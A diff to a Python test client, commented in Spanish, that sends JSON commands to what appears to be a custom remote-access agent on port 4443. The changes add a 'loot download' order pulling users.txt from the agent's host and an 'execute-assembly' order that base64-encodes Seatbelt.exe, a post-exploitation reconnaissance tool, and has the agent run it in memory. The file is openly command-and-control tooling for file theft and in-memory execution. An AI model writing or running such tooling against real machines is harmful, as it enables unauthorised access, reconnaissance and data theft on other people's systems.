@@ -4,15 +4,19 @@ import urllib.request
 import sys
 import os
 
+import base64
+
 # --- CONFIGURACIÓN DE LA PRUEBA ---
 AGENT_HOST = "localhost"  # Si usas WSL, este valor se actualizará automáticamente
 AGENT_PORT = 4443
-API_KEY = "claveSuperSecreta123"
+API_KEY = "clave"
 
 # --- CONSTRUCCIÓN DEL COMANDO A ENVIAR ---
 # ¡AQUÍ ESTÁ LA MAGIA!
 # Le ordenamos al agente que ejecute el comando 'scan' con los argumentos necesarios,
 # incluyendo el flag '--intel' para activar el análisis con Ollama.
+
+"""
 comando_a_enviar = {
     "comando": "scan",
     "args": [
@@ -23,9 +27,40 @@ comando_a_enviar = {
         # "-o", "csv",
         # "-c", "500"
     ]
-}
+}"""
 
+# En test_agent.py
+comando_a_enviar = {
+    "comando": "loot",
+    "args": [
+        "download",
+        "-f", "users.txt" # ¡Usa dobles barras invertidas en JSON!
+    ]
+}
 # --- LÓGICA DE LA CONEXIÓN (sin cambios) ---
+
+# --- NUEVO COMANDO A ENVIAR ---
+try:
+    # 1. Leer el .exe como bytes
+    with open("Seatbelt.exe", "rb") as f:
+        assembly_bytes = f.read()
+    
+    # 2. Codificarlo en Base64
+    assembly_base64 = base64.b64encode(assembly_bytes).decode("utf-8")
+
+    # 3. Construir la orden
+    comando_a_enviar = {
+        "comando": "execute-assembly",
+        "args": [
+            assembly_base64,
+            "system" # Argumento para Seatbelt: "system" ejecuta una colección de chequeos
+        ]
+    }
+    
+except FileNotFoundError:
+    print("Error: 'Seatbelt.exe' no encontrado. Descárgalo y ponlo en la misma carpeta.")
+    exit()
+
 
 def test_agent():
     """
